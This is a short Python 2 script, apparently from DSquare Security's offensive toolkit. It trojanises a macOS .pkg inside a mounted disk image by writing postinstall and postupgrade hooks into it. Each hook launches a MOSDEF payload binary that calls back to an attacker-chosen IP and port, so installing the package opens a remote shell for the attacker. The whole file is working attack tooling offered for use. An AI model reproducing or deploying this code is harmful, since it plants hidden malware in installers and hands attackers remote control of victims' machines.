#! /usr/bin/env python
# -*- coding: UTF-8  -*-

# Copyright (c) 2007-2011 DSquare Security, LLC
# All rights reserved.

import os, sys, getopt

def setup_mosdef(mountpoint, ip, port):
  files = ['postinstall', 'postupgrade']
  script = """#!/bin/sh

exec /Applications/Utilities/osx_intel_universal IP PORT &"""
  script = script.replace("IP", ip)
  script = script.replace("PORT", port)
  for f in files:
    d = open(os.path.join(mountpoint, "d2sec_macpkg.pkg/Contents/Resources/", f), "w")
    d.write(script)
    d.close()
  
def usage(cmd):
  print "$ %s -m <dmg mountpoint> -i <ip mosdef> -p <port mosdef>\n" % cmd
  print """For ex.: $ %s -m "/Volumes/d2sec_macpkg/" -i 172.16.244.143 -p 5555\n""" % cmd
  sys.exit(-1)


if __name__ == "__main__":
  mountpoint = ip = port = ''
  try:
    opts, args = getopt.getopt(sys.argv[1:], "hm:i:p:")
  except getopt.GetoptError, err:
    print str(err)
    usage(sys.argv[0])
    raise SystemExit
  vendor = model = ''
  for o, a in opts:
    if o == "-m": mountpoint = a
    elif o == "-i": ip = a
    elif o == "-p": port = a
    elif o == "-h":
      usage(sys.argv[0])
      raise SystemExit
    else:
      print "[-] option not recognized"
      usage(sys.argv[0])
      raise SystemExit
  if not mountpoint or not ip or not port:
    usage(sys.argv[0])
  setup_mosdef(mountpoint, ip, port) 
